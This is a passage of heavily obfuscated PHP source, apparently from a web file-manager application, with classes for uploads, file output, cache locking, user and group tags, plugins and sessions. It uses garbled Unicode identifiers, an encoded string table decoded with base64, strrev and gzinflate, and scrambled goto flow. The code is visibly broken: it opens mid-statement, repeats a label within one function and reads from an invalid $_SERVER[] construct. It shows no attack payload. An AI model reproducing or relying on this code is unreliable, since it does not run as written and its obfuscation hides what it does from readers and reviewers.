$dг¡; } public function setModifyTime($a˫, $F׺ؐ = '') { $B =& $_SERVER[]; if (!$a˫) { return; } $this->model->where(array($B[412] => $a˫))->save(array($B[84] => $F׺ؐ)); } public function upload($B, $e, $Eȫڶ = false, $C = REPEAT_REPLACE) { $a =& $_SERVER[]; $f߭ = $this->parse($B); $Bş = $this->model->addFile($f߭[$a[395]], $e, $f߭[$a[76]], $Eȫڶ, $C); return $this->getPathOuter($Bş); } public function uploadFileByID($B؅˜, $Dћ٭, $dؒ鋨) { $e焍 =& $_SERVER[]; $f = $this->parse($B؅˜); $DŸ = $this->model->addFileByFileID($f[$e焍[395]], $Dћ٭, $f[$e焍[76]], $dؒ鋨); return $this->getPathOuter($DŸ); } public function addFileByRemote($eώ, $f٧, $Dߢ = array(), $CĎÅ = '', $c) { $aܜ =& $_SERVER[]; $e = $this->parse($eώ); $CĎÅ = empty($CĎÅ) ? $e[$aܜ[76]] : $CĎÅ; $A = $this->model->addFileByRemote($e[$aܜ[395]], $f٧, $CĎÅ, $Dߢ, $c); return $this->getPathOuter($A); } public function uploadLink($Bϰ, $Dꅾ = 0) { $cס =& $_SERVER[]; $E꾈 = $this->parse($Bϰ); $Aҧ = _get($GLOBALS[$cס[7]], $cס[1225]); $a = _get($GLOBALS[$cס[7]], $cס[1226]); $Bϰ = Model($cס[597])->createFileName($E꾈[$cס[76]], $Aҧ, $a); return IO::uploadLink($Bϰ, $Dꅾ); } public function fileNameAuto($bک, $E, $Fݚ = REPEAT_REPLACE, $D = false) { return $this->model->fileNameAuto($bک, $E, $Fݚ, $D); } public function fileNameExist($eޏԇ, $F̓) { return $this->model->fileNameExist($eޏԇ, $F̓); } protected function _fileOut($fŲלѦ, $FҚ° = false, $bġ = false, $aΐ = '', $cқ觱 = false) { goto dԗ; a: if ($cқ觱) { return IO::fileOutServer($d荪ָ[$d[76]], $FҚ°, $b꒞, $aΐ); } IO::fileOut($d荪ָ[$d[76]], $FҚ°, $b꒞, $aΐ); goto a; dԗ: $d =& $_SERVER[]; $cߋϑ = $this->model->sourceInfo($fŲלѦ); if ($cߋϑ[$d[405]] == $d[87]) { header($d[1227]); die; } goto a; a: $d荪ָ = $this->model->fileInfoGet($fŲלѦ); $aΐ = $d荪ָ[$d[170]] ? $d荪ָ[$d[170]] : $aΐ; $b꒞ = isset($GLOBALS[$d[1228]]) ? $GLOBALS[$d[1228]] : $cߋϑ[$d[28]]; goto a; a: } public function fileOut($F, $eߖ = false, $B쓉 = false, $BŎ = '') { $this->_fileOut($F, $eߖ, $B쓉, $BŎ); } public function fileOutServer($C, $eͽ = false, $e = false, $c̊󖳃 = '') { $this->_fileOut($C, $eͽ, $e, $c̊󖳃, !0); } protected function _fileOutImage($e, $Cڬ = 250) { goto Bѷ; Bѷ: $E =& $_SERVER[]; $Dߊ̟ = $this->model->pathInfo($e); if ($Dߊ̟[$E[405]] == $E[87]) { show_json($E[1229] . $e, !1); } goto f; eܻ: $GLOBALS[$E[1228]] = $b[$E[28]]; $GLOBALS[$E[162]] = $b; IO::fileOutImage($b[$E[76]], $Cڬ); goto d; f: $b = $this->model->fileInfoGet($e); $b[$E[28]] = $Dߊ̟[$E[28]]; $b[$E[163]] = $Dߊ̟[$E[163]]; goto eܻ; d: } public function fileOutImage($B, $B舄 = 250) { $this->_fileOutImage($B, $B舄); } public function fileOutImageServer($FȒ, $BϮ = 250) { $this->_fileOutImage($FȒ, $BϮ); } public function link($b, $D篘 = '') { $cʟʌ = $this->model->fileInfoGet($b); return IO::link($cʟʌ[$_SERVER[][76]], $D篘); } protected function parse($cݺ) { $ĕ =& $_SERVER[]; if (strstr($cݺ, $ĕ[8]) === !1) { return array($ĕ[414] => intval($cݺ), $ĕ[76] => $ĕ[33], $ĕ[1224] => array()); } $d㥙ʼߟ = explode($ĕ[8], trim($cݺ, $ĕ[8])); if (count($d㥙ʼߟ) < 2) { show_tips($cݺ . $ĕ[1230]); } return array($ĕ[414] => intval($d㥙ʼߟ[0]), $ĕ[76] => $d㥙ʼߟ[1], $ĕ[1224] => array_slice($d㥙ʼߟ, 1)); } } goto dͪ׉; fħ׌: class CacheLockRedis { public function lock($E덝, $Eݭ = 10) { $d̺ = Cache::init(); $C򶐐 = microtime(!0) + $Eݭ; while (microtime(!0) < $C򶐐) { $BዘӶ = $d̺->get($E덝); if (!$BዘӶ) { $aベ = $d̺->setLock($E덝, $C򶐐, $Eݭ); if ($aベ) { return !0; } } else { if ($BዘӶ < microtime(!0)) { $d̺->set($E덝, $C򶐐, $Eݭ * 2); if ($d̺->get($E덝) === $BዘӶ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($c֪) { return Cache::init()->get($c֪); } public function unlock($B󛶧) { return Cache::init()->remove($B󛶧); } } class CacheLockMemcached { public function lock($eׇ, $F = 0) { $F = Cache::init(); $e = microtime(!0) + $F; while (microtime(!0) < $e) { $F = $F->get($eׇ); if (!$F || $F < microtime(!0)) { $Dҧտ = $F->handle->add($eׇ, $e, $F); if ($Dҧտ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($E) { return Cache::init()->get($E); } public function unlock($DѪ) { return Cache::init()->remove($DѪ); } } class CacheLockDatabase { public function lock($E, $cܔ = 0) { $fѭ = Model($_SERVER[][813]); $E⚐ = microtime(!0) + $cܔ; while (microtime(!0) < $E⚐) { $f = $fѭ->get($E); if (!$f || $f < microtime(!0)) { $b좣 = $fѭ->set($E, $E⚐); if ($b좣) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($AƬ) { return Model($_SERVER[][813])->get($AƬ); } public function unlock($c˦) { Model($_SERVER[][813])->remove($c˦); } } goto B; Aب: class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\137\157\160\x74\151\x6f\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($f) { $Eˇ =& $_SERVER[]; if (!defined($Eˇ[468])) { define($Eˇ[468], 0); } return "\125\x73\x65\162\x4f\x70\x74\x69\x6f\x6e\137{$f}\x5f" . USER_ID; } protected function filterWhere($a߬) { $F憷 =& $_SERVER[]; if (!defined($F憷[468])) { define($F憷[468], 0); } $a߬[$F憷[1546]] = USER_ID; return $a߬; } public function cacheRemoveUser($e⅒, $fܤ) { return Cache::remove("\x55\x73\145\x72\x4f\160\164\x69\157\x6e\137{$e⅒}\137" . $fܤ); } protected function optionDefault($B = '') { $E =& $_SERVER[]; if ($B == $E[33]) { return $GLOBALS[$E[6]][$E[2186]]; } if ($B == $E[2187]) { return $GLOBALS[$E[6]][$E[2188]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\56\164\x61\x67\x4c\x69\163\164"; public $modelType = "\125\163\x65\x72\x4f\x70\x74\151\157\x6e"; public $field = array("\156\141\155\145", "\x73\x74\x79\x6c\145", "\x73\x6f\162\164"); public function listData($fꍔ = false, $fޖ = "\163\157\x72\164", $C굢 = false) { return parent::listData($fꍔ, $fޖ, $C굢); } public function remove($bđ) { return parent::remove($bđ); } public function add($D𬳶Ǉ, $f = "\154\x61\x62\145\x6c\55\x67\162\145\171\x2d\156\157\162\155\x61\154") { $fۼ =& $_SERVER[]; if ($this->findByName($D𬳶Ǉ)) { return !1; } $E񡦷 = array($fۼ[415] => $D𬳶Ǉ, $fۼ[478] => $f, $fۼ[1719] => $this->getSort($fۼ[256]) + 1); return parent::insert($E񡦷); } public function update($b, $Eъ) { $e𨲓 =& $_SERVER[]; $Cףúձ = $this->listData($b); $B񥬌 = $this->findByName($Eъ[$e𨲓[28]]); if (!$Cףúձ || $B񥬌 && $B񥬌[$e𨲓[395]] != $Cףúձ[$e𨲓[395]]) { return !1; } return parent::update($b, $Eъ); } public function moveTop($fÆ) { $cޮߏ =& $_SERVER[]; $c = parent::listData(); $D = $this->getSort($cޮߏ[255]); foreach ($c as &$cу⑗) { if ($cу⑗[$cޮߏ[395]] == $fÆ) { $cу⑗[$cޮߏ[1738]] = $D; continue; } $cу⑗[$cޮߏ[1738]] += 1; } unset($cу⑗); return parent::resetData($c); } public function moveBottom($Eٓ) { $Bǈ =& $_SERVER[]; $A۩ = $this->getSort($Bǈ[256]) + 1; return parent::update($Eٓ, array($Bǈ[1738] => $A۩)); } public function resetSort($F) { goto B̈́; fʐ: for ($bȿ = 0; $bȿ < count($F); $bȿ++) { $e[$F[$bȿ] . $Cܠ[33]] = $bȿ + 1; } $BĒ = parent::listData(); foreach ($BĒ as &$eթ) { $dƍ = $e[$eթ[$Cܠ[395]]]; $eթ[$Cܠ[1738]] = $dƍ ? $dƍ : $eթ[$Cܠ[1738]]; } goto dԾ; dԾ: unset($eթ); return parent::resetData($BĒ); goto E։; B̈́: $Cܠ =& $_SERVER[]; $e = array(); $F = is_array($F) ? $F : array(); goto fʐ; E։: } private function getSort($f߷) { $e =& $_SERVER[]; $CΣФА = parent::listData(); $dݷ = array_to_keyvalue($CΣФА, $e[33], $e[1738]); if (!$dݷ) { $dݷ = array(0); } $E祊 = $f߷ == $e[256] ? max($dݷ) : min($dݷ); return intval($E祊); } } goto DΊ; fֲ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($a狍) { $eǰ =& $_SERVER[]; return array($eǰ[1820] => array($a狍[0], $eǰ[1821]), $eǰ[1822] => array($a狍[0], $eǰ[1823])); } protected function get($eǕ) { $EӺ =& $_SERVER[]; $B띜 = Model($EӺ[516])->metaGet($eǕ, $EӺ[1824]); $c = json_decode($B띜, !0); return $c ? $c : array($EӺ[1825] => $EӺ[87], $EӺ[367] => array()); } protected function set($Aԏ, $e̡) { $aƓ =& $_SERVER[]; $e̡ = $e̡ ? $e̡ : array($aƓ[1825] => $aƓ[87], $aƓ[367] => array()); Model($aƓ[516])->metaSet($Aԏ, $aƓ[1824], json_encode($e̡)); return Model($aƓ[516])->metaSet($Aԏ, $aƓ[1824], json_encode($e̡)); } protected function getByTagID($a˺䋋, $c) { goto b؄ނ; b؄ނ: $F =& $_SERVER[]; if (!$a˺䋋 || !$c) { return !1; } if (!Model($F[516])->getInfoSimple($a˺䋋)) { return !1; } goto bƷ; bƷ: $Aʥ = $this->get($a˺䋋); if (!$Aʥ || !isset($Aʥ[$F[367]])) { return !1; } $f⤿ؿ = array_find_by_field($Aʥ[$F[367]], $F[395], $c); goto f; f: return is_array($f⤿ؿ) ? $f⤿ؿ : !1; goto f蠗̽; f蠗̽: } public function listSource($c, $E) { goto fǒ; c䔟: foreach ($E as $Aϑ => $fß¨) { $aŃ = !0; if (!$E) { $E˴[] = $Aϑ; continue; } foreach ($E as $c) { if (!in_array($c, $fß¨)) { $aŃ = !1; break; } } if ($aŃ) { $E˴[] = $Aϑ; } } if (!$E˴) { return array(); } $bݘ = array($b[412] => array($b[413], $E˴), $b[498] => $c, $b[406] => SourceModel::TYPE_GROUP); goto EɅ; aŧ: $F˓َ = array_to_keyvalue($EؕʴՃ[$b[75]], $b[33], $b[397]); $EƜ = array_to_keyvalue($EؕʴՃ[$b[74]], $b[33], $b[397]); $c = array_merge($EƜ, $F˓َ); goto bܵ; bܵ: foreach ($E˴ as $bį) { if (!in_array($bį, $c)) { $b[] = $bį; } } if ($b) { $this->removeBySource($c, $b); } return $EؕʴՃ; goto eג; EɅ: $EؕʴՃ = Model($b[1223])->listSource($bݘ); if (!$EؕʴՃ || count($E˴) == $EؕʴՃ[$b[364]][$b[365]]) { return $EؕʴՃ; } $b = array(); goto aŧ; AŔ: $E = array(); foreach ($AȨ纟 as $cȶ) { $bį = $cȶ[$b[76]]; if (!$bį) { continue; } if (!isset($E[$bį])) { $E[$bį] = array(); } $E[$bį][] = $cȶ[$b[421]]; } $E˴ = array(); goto c䔟; fǒ: $b =& $_SERVER[]; if ($E && !is_array($E)) { $E = array($E); } $AȨ纟 = $this->listData($c); goto AŔ; eג: } protected function listData($b˗ɡ) { $eŗ =& $_SERVER[]; $dӹ = array($eŗ[1537] => 0, $eŗ[477] => array($eŗ[1826], 0), $eŗ[417] => $eŗ[1827] . $b˗ɡ); $f줌 = $eŗ[1828]; $cß = $this->field($f줌)->where($dӹ)->order($eŗ[1829])->select(); return $cß ? $cß : array(); } protected function addToTag($eŤ󕐈, $cˇ, $fΐ) { $C =& $_SERVER[]; if (!$this->getByTagID($eŤ󕐈, $fΐ) || !$cˇ) { return !1; } if (!Model($C[809])->pathInfo($cˇ)) { return !1; } $Bë = array($C[1537] => 0, $C[477] => $fΐ, $C[416] => $cˇ, $C[417] => $C[1830] . $eŤ󕐈, $C[415] => $C[33], $C[1719] => 0); if ($this->where($Bë)->find()) { return !1; } return $this->add($Bë); } protected function removeFromTag($fۦ, $E, $f) { $F =& $_SERVER[]; if (!$this->getByTagID($fۦ, $f) || !$E) { return !1; } if (is_array($E)) { $E = array($F[7], $E); } $F = array($F[1537] => 0, $F[477] => $f, $F[417] => $F[1830] . $fۦ, $F[416] => $E); return $this->where($F)->delete(); } protected function removeByTag($C, $d) { $e =& $_SERVER[]; if (!$this->getByTagID($C, $d)) { return !1; } $c = array($e[1537] => 0, $e[477] => $d, $e[417] => $e[1830] . $C); return $this->where($c)->delete(); } protected function removeBySource($eѮƺΤ, $fԉ) { $D󳰔 =& $_SERVER[]; if (!$eѮƺΤ || !$fԉ) { return !1; } if (is_array($fԉ)) { $fԉ = array($D󳰔[7], $fԉ); } $bߥ = array($D󳰔[1537] => 0, $D󳰔[416] => $fԉ, $D󳰔[477] => array($D󳰔[990], 0), $D󳰔[417] => $D󳰔[1830] . $eѮƺΤ); return $this->where($bߥ)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\x6d\56\160\x6c\165\147\x69\x6e\x4c\151\163\164"; public $field = array("\x6e\x61\155\x65", "\x73\x74\141\164\x75\163", "\162\x65\147\x69\x65\163\164", "\x63\x6f\x6e\146\x69\147"); public function loadList($B = false) { $D昭 = array_to_keyvalue($this->listData(), $_SERVER[][28]); if ($B) { return $D昭[$B]; } return $D昭; } public function init() { $b =& $_SERVER[]; Hook::trigger($b[1831]); $dĂ = $this->loadPluginList(); foreach ($dĂ as $c => $Eݽޖ) { $bי = $this->appAllow($c, $Eݽޖ); if (!$bי) { continue; } foreach ($Eݽޖ[$b[1832]] as $f΃ => $C쐻) { Hook::bind($f΃, $C쐻); } } Hook::trigger($b[1833]); Hook::trigger(ACTION); } public function appAllow($B҇, $Bģ, $c = true) { $eՃЭ =& $_SERVER[]; $Aͅͳ = PLUGIN_DIR . $B҇ . $eՃЭ[1834]; if (!is_array($Bģ) || !is_array($Bģ[$eՃЭ[1832]]) || $Bģ[$eՃЭ[727]] != 1 || !is_file($Aͅͳ)) { return !1; } if ($GLOBALS[$eՃЭ[499]] == 1) { return !0; } if ($c && !Action($eՃЭ[1835])->checkAuth($B҇)) { return !1; } return !0; } public function unInstall($D) { $D׎ =& $_SERVER[]; $c꓌٘ = $this->loadList($D); if (file_exists(PLUGIN_DIR . $D)) { Hook::apply($D . $D׎[1836]); } $this->remove($c꓌٘[$D׎[395]]); } public function changeStatus($A, $DܕƷ) { $A =& $_SERVER[]; $a = $this->loadList($A); if ($DܕƷ) { Hook::apply($A . $A[1837]); } $this->update($a[$A[395]], array($A[1838] => $DܕƷ)); } public function appRegist($c, $f𖱵뷒) { $fΫ =& $_SERVER[]; $e׌밖 = $this->loadList($c); if ($e׌밖) { $this->update($e׌밖[$fΫ[395]], array($fΫ[1832] => $f𖱵뷒)); } else { $c = array($fΫ[28] => $c, $fΫ[1832] => $f𖱵뷒, $fΫ[727] => 0, $fΫ[6] => $this->getConfigDefault($c)); $this->insert($c); } } public function getConfigDefault($DѠ) { $EȊ =& $_SERVER[]; $D޳ = array(); $d = $this->getPackageJson($DѠ); if (!$d && is_array($d[$EȊ[1839]])) { return $D޳; } foreach ($d[$EȊ[1839]] as $Bϊ => $B޳) { if (!isset($B޳[$EȊ[372]]) || isset($D޳[$Bϊ])) { continue; } $D޳[$Bϊ] = $B޳[$EȊ[372]]; } return $D޳; } public function getPackageJson($c) { return Hook::apply($c . $_SERVER[][1840]); } public function getConfig($Dܮ߷, $A = false) { $a =& $_SERVER[]; $cݙ = array(); $e蚌 = $this->loadList($Dܮ߷); if ($e蚌 && is_array($e蚌[$a[6]])) { $cݙ = $e蚌[$a[6]]; } if (!$cݙ || $A) { $cݙ = $this->getConfigDefault($Dܮ߷); } return $cݙ; } public function setConfig($Aي, $Eٵ = false) { goto c֠; c֠: $bʠ =& $_SERVER[]; $D䩫 = $this->loadList($Aي); if (!$D䩫) { return !1; } goto d; d: $AŴ = $D䩫[$bʠ[6]]; if ($Eٵ == !1) { $AŴ = array(); $Eٵ = $this->getConfigDefault($Aي); } foreach ($Eٵ as $bވ => $C޷) { $AŴ[$bވ] = is_string($C޷) ? trim($C޷) : $C޷; } goto A鉙; A鉙: $this->update($D䩫[$bʠ[395]], array($bʠ[6] => $AŴ)); goto eǐʪ; eǐʪ: } public function viewList() { goto dᛶ; A: return $fŽ; goto Dڽ; dᛶ: $BƊǏ =& $_SERVER[]; $Fѕζ = $this->loadList(); $this->pluginScan($Fѕζ); goto c; c: $Fѕζ = $this->loadPluginList(); $fŽ = array(); foreach ($Fѕζ as $Cڨׄ => $B) { unset($B[$BƊǏ[1832]], $B[$BƊǏ[6]]); $Fޔ = PLUGIN_DIR . $B[$BƊǏ[28]] . $BƊǏ[1834]; if (!is_file($Fޔ)) { continue; } $F = Hook::apply($B[$BƊǏ[28]] . $BƊǏ[1840]); if (is_array($F)) { $fŽ[$Cڨׄ] = array_merge($B, $F); } } goto A; Dڽ: } private function loadPluginList() { $E =& $_SERVER[]; $e = $this->loadList(); if (strtolower(MOD) == $E[1841]) { return $e; } $F = Hook::trigger($E[1842], $e); if ($e && !$F) { die; } return $F ? $F : $e; } private function pluginScan($Bݱ) { $E =& $_SERVER[]; recursion_dir(PLUGIN_DIR, $d, $E·, 0); foreach ($d as $E) { $DԄ = get_path_this($E); if (isset($Bݱ[$DԄ]) || !file_exists($E . $E[1843]) || !file_exists($E . $E[1834])) { continue; } Hook::apply($DԄ . $E[1837]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\155\x5f\x73\x65\163\163\151\x6f\x6e"; public function get($D܏) { $bĮ =& $_SERVER[]; $Fؠ = $this->where(array($bĮ[1844] => $D܏))->find(); if (!is_array($Fؠ)) { return !1; } return $Fؠ[$bĮ[732]]; } public function set($Eǔ, $FȆ, $e胞 = 3600) { $Dߙ쏶 =& $_SERVER[]; $Eȟ = array($Dߙ쏶[1844] => $Eǔ, $Dߙ쏶[1753] => $FȆ, $Dߙ쏶[1845] => $e胞 + time()); if (Session::get($Dߙ쏶[1846])) { $Eȟ[$Dߙ쏶[1546]] = Session::get($Dߙ쏶[1846]); } else { $Eȟ[$Dߙ쏶[1546]] = 0; } if ($this->get($Eǔ)) { return $this->where(array($Dߙ쏶[1844] => $Eǔ))->save($Eȟ); } else { return $this->add($Eȟ, array(), !0); } } public function remove($aӌ) { return $this->where(array($_SERVER[][1844] => $aӌ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[][1847] . time())->delete(); } } goto bא; aĎպ: $Dΰ = strrev(base64_decode($_SERVER[][0])); function binCheckNeq($A, $aׂÜ) { return $A != $aׂÜ; } $_SERVER[$_SERVER[][1]] = $Dΰ($_SERVER[$_SERVER[][2]]); goto F󴭧ϳ; bޑ: define($_SERVER[][0], $_SERVER[][1]); $_SERVER[] = explode($_SERVER[][2], gzinflate(substr($_SERVER[][3], 10, -8))); function binCheckEq($D홉ѝ, $a㒲) { return $D홉ѝ == $a㒲; } goto aĎպ; DΊ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($e) { $a򅢻 =& $_SERVER[]; return array($a򅢻[1822] => array(USER_ID, $a򅢻[1823])); } protected function listData() { $eޖ =& $_SERVER[]; $F = array($eޖ[1537] => USER_ID, $eޖ[477] => array($eޖ[1826], 0)); $E = $eޖ[1828]; $Aؘ͑ = $this->field($E)->where($F)->order($eޖ[1829])->select(); return $Aؘ͑ ? $Aؘ͑ : array(); } protected function listByTag($Aއ) { } protected function addToTag($e, $fͧ) { $d˺ =& $_SERVER[]; if (!Model($d˺[1962])->listData($fͧ) || !Model($d˺[809])->pathInfo($e)) { return !1; } $Bݝά = array($d˺[1537] => USER_ID, $d˺[477] => $fͧ, $d˺[416] => $e, $d˺[417] => $d˺[411], $d˺[415] => $d˺[33], $d˺[1719] => 0); if ($this->where($Bݝά)->find()) { return !1; } return $this->add($Bݝά); } protected function removeFromTag($E֎, $A̒՜) { $a曱 =& $_SERVER[]; if (!Model($a曱[1962])->listData($A̒՜)) { return !1; } if (is_array($E֎)) { $E֎ = array($a曱[7], $E֎); } $cܻѐ = array($a曱[1537] => USER_ID, $a曱[477] => $A̒՜, $a曱[417] => $a曱[411], $a曱[416] => $E֎); return $this->where($cܻѐ)->delete(); } protected function removeByTag($D) { $a =& $_SERVER[]; if (!$D) { return !1; } $eĠ = array($a[1537] => USER_ID, $a[477] => $D); return $this->where($eĠ)->delete(); } protected function removeBySource($b) { $F =& $_SERVER[]; if (is_array($b)) { $b = array($F[7], $b); } $c = array($F[1537] => USER_ID, $F[416] => $b, $F[477] => array($F[990], 0)); return $this->where($c)->delete(); } }